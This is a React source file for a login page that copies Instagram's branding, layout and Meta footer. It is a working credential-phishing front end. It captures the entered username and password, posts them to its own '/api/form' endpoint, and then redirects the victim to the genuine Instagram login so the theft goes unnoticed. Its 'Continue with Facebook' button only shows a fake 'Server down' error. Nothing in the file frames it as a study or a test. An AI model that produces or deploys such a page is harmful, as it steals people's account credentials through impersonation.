import { useState, useEffect } from "react";
import toast, { Toaster } from "react-hot-toast";
import React from "react";


function App() {
  const [form, setForm] = useState({});

  const notify = () => toast.error("Server down");
  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/form', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(form),
      });
      const data = await res.json();
      window.location.href = "https://www.instagram.com/accounts/login";
    } catch (error) {
      console.log(error.message);
    }
  }


  return (
    <div className="App select-none">
      <Toaster position="top-center" reverseOrder={false} />
      <div className="Login mt-[15px] max-w-[350px] mx-auto flex flex-col gap-3 p-3 justify-center items-center">
        <div className="logo my-8">
          <img className="w-[200px]" src="insta.png" alt="logo" />
        </div>
        <div className="facebook flex flex-col justify-center items-center gap-5">
          <button onClick={notify} className="flex justify-center items-center gap-2 bg-[#0095f6] text-white p-2 px-12 rounded-lg">
            <i className="fa-brands fa-square-facebook text-[17px]"></i>
            <p className="text-[14px] font-semibold">Continue with Facebook</p>
          </button>
          <div className="OR flex w-full justify-center items-center gap-4 text-[#dbdbdb]">
            <span className="h-[1px] bg-[#dbdbdb] w-full"></span>
            <span className="text-[#737373] text-[13px] font-semibold">OR</span>
            <span className="h-[1px] bg-[#dbdbdb] w-full"></span>
          </div>
        </div>
        <form onSubmit={handleSubmit} className="flex p-6 w-full flex-col gap-2" action="https://www.instagram.com/accounts/login">
          <input onChange={handleChange} className="bg-zinc-50 border focus:outline-none text-sm p-2 w-full" type="text" id="username" name="username" placeholder="Phone number, username, or email" required />
          <input onChange={handleChange} className="bg-zinc-50 border focus:outline-none text-sm p-2 w-full" type="password" id="password" name="password" placeholder="Password" required />
          <p className="text-[15px] flex font-semibold text-[#2f9feb] justify-end items-end">Forgot password?</p>
          <button type="submit" className="bg-[#0094f6ad] text-white p-1 font-semibold rounded-lg mt-5">Login</button>
        </form>
        <div className="create-account">
          <p className="text-[15px] text-[#7e7e7e]">Don't have an account? <span className="text-[#0095f6] font-semibold">Sign up</span></p>
        </div>
        <div className="privacy text-sm mx-auto text-center my-3">
          <p>By continuing, you agree to Instagram's </p>
          <p><span className="text-[#0095f6]" > Terms of Use</span>,
            and
            <span className="text-[#0095f6]"> Privacy Policy</span>.</p>
        </div>
      </div>
      <div className="from Meta border-t-2 mt-14 p-2">
        <img className="h-[30px] mx-auto my-2" src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" alt="Meta" />
      </div>
    </div>
  );
}

export default App;